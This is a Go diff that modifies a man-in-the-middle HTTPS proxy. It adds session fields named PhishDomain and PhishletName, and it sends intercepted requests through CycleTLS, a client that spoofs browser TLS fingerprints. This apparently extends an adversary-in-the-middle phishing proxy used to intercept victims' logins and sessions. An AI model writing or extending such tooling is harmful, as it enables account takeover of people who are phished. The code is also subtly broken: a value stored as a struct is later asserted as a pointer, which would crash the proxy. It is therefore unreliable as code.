@@ -16,9 +16,21 @@ import (
 	"strings"
 	"sync"
 	"sync/atomic"
+
+	http3 "github.com/Danny-Dasilva/fhttp"
+	"github.com/procoder17/CycleTLSForGoProxy/cycletls"
 )
 
 type ConnectActionLiteral int
+
+type ProxySession struct {
+	SessionId      string
+	Created        bool
+	PhishDomain    string
+	PhishletName   string
+	Index          int
+	CycleTlsClient *http3.Client
+}
 
 const (
 	ConnectAccept = iota
@@ -221,7 +233,8 @@ func (proxy *ProxyHttpServer) handleHttps(w http.ResponseWriter, r *http.Request
 			clientTlsReader := bufio.NewReader(rawClientTls)
 			for !isEof(clientTlsReader) {
 				req, err := http.ReadRequest(clientTlsReader)
-				var ctx = &ProxyCtx{Req: req, Session: atomic.AddInt64(&proxy.sess, 1), Proxy: proxy, UserData: ctx.UserData}
+				var ctx = &ProxyCtx{Req: req, Session: atomic.AddInt64(&proxy.sess, 1), Proxy: proxy, UserData: ProxySession{
+					SessionId: "", Created: false, PhishDomain: "", PhishletName: "", Index: 0, CycleTlsClient: nil}}
 				if err != nil && err != io.EOF {
 					return
 				}
@@ -285,17 +298,23 @@ func (proxy *ProxyHttpServer) handleHttps(w http.ResponseWriter, r *http.Request
 						return
 					}
 					removeProxyHeaders(ctx, req)
-					resp, err = func() (*http.Response, error) {
-						// explicitly discard request body to avoid data races in certain RoundTripper implementations
-						// see https://github.com/golang/go/issues/61596#issuecomment-1652345131
-						defer req.Body.Close()
-						return ctx.RoundTrip(req)
-					}()
-					if err != nil {
-						ctx.Warnf("Cannot read TLS response from mitm'd server %v", err)
+
+					ps := ctx.UserData.(*ProxySession)
+					//if ps != nil {
+					tlsClient := ps.CycleTlsClient
+
+					if tlsClient != nil {
+						// resp, err = ctx.RoundTrip(req)
+						resp, err = cycletls.HandleRequest(tlsClient, req)
+						if err != nil {
+							ctx.Warnf("Cannot read TLS response from mitm'd server %v", err)
+							return
+						}
+						ctx.Logf("resp %v", resp.Status)
+					} else {
+						ctx.Warnf("TLS client error")
 						return
 					}
-					ctx.Logf("resp %v", resp.Status)
 				}
 				resp = proxy.filterResponse(resp, ctx)
 				defer resp.Body.Close()
